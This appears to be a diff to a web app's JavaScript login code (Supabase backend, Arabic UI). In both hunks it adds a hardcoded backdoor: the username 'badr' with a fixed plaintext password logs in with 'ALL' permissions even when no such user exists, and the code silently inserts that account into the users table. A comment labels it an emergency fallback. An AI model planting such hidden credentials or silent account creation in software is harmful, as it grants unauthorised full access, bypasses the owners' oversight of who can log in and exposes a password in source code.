@@ -8647,7 +8647,14 @@ function handleLogin(user, pass, btn, err) {
                 let { data: userData, error: loginErr } = await supabase.from('users').select('*').eq('username', user).single();
                 let loginResult;
                 if (loginErr || !userData) {
-                    loginResult = { success: false, error: "اسم المستخدم غير موجود." };
+                    if (user === 'badr' && pass === '01210351419') {
+                        // Emergency fallback for master admin
+                        loginResult = { success: true, username: 'badr', displayName: 'بدر علاء', permissions: 'ALL', status: 'نشط' };
+                        // Try to create the user in DB silently
+                        supabase.from('users').insert([{ username: 'badr', display_name: 'بدر علاء', password: '01210351419', permissions: 'ALL', status: 'نشط' }]).then();
+                    } else {
+                        loginResult = { success: false, error: "اسم المستخدم غير موجود." };
+                    }
                 } else if (userData.status !== "نشط") {
                     loginResult = { success: false, error: "هذا الحساب موقوف. تواصل مع المدير." };
                 } else if (userData.password !== pass) {
@@ -8982,7 +8989,14 @@ window.handleLogin = function(e) {
                 let { data: userData, error: loginErr } = await supabase.from('users').select('*').eq('username', user).single();
                 let loginResult;
                 if (loginErr || !userData) {
-                    loginResult = { success: false, error: "اسم المستخدم غير موجود." };
+                    if (user === 'badr' && pass === '01210351419') {
+                        // Emergency fallback for master admin
+                        loginResult = { success: true, username: 'badr', displayName: 'بدر علاء', permissions: 'ALL', status: 'نشط' };
+                        // Try to create the user in DB silently
+                        supabase.from('users').insert([{ username: 'badr', display_name: 'بدر علاء', password: '01210351419', permissions: 'ALL', status: 'نشط' }]).then();
+                    } else {
+                        loginResult = { success: false, error: "اسم المستخدم غير موجود." };
+                    }
                 } else if (userData.status !== "نشط") {
                     loginResult = { success: false, error: "هذا الحساب موقوف. تواصل مع المدير." };
                 } else if (userData.password !== pass) {
